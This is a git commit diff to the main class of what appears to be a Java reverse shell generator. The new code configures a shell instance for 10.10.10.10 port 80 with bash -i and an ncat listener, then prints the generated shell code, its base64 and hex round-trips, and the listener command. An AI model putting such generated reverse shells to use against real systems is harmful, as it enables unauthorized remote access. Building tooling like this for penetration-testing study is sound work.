4d28def7fdeaa7ca45e25ca2a8469b82ddbb9fd9
Missael Cortes <60858064+missaelcorm@users.noreply.github.com>
2023-07-02 00:14:44 -0600

    Testing in main
    Testing factory method, and different ways to print our ReverseShell instance, by encoding and decoding in b64 and hex. At the same time as JSON Object and test gettin Listener code

--- src/App.java
+++ src/App.java
@@ -1,7 +1,22 @@
+import com.iteso.ReverseShellGenerator.DEncoder;
+import com.iteso.ReverseShellGenerator.ReverseShell;
+import com.iteso.ReverseShellGenerator.ReverseShell.LISTENER;
+import com.iteso.ReverseShellGenerator.ReverseShell.REVERSE_TYPE;
 import com.iteso.ReverseShellGenerator.ReverseShell.SHELLS;
+
 public class App {
     public static void main(String[] args) throws Exception {
-        System.out.println("Hello, World!");
+        ReverseShell shell = ReverseShell.getShellInstance("10.10.10.10", 
+                                                            80, 
+                                                            LISTENER.NCAT_EXE,
+                                                            REVERSE_TYPE.BASH_i,
                                                             SHELLS.BIN_BASH);
+
+        System.out.println(shell);
+
+        System.out.println(shell.getShellCode());
+        System.out.println(DEncoder.decodeFromBase64(DEncoder.encodeToBase64(shell.getShellCode())));
+        System.out.println(DEncoder.decodeFromHex(DEncoder.encodeToHex(shell.getShellCode())));
+        System.out.println(shell.getListenerCode());
     }
 }
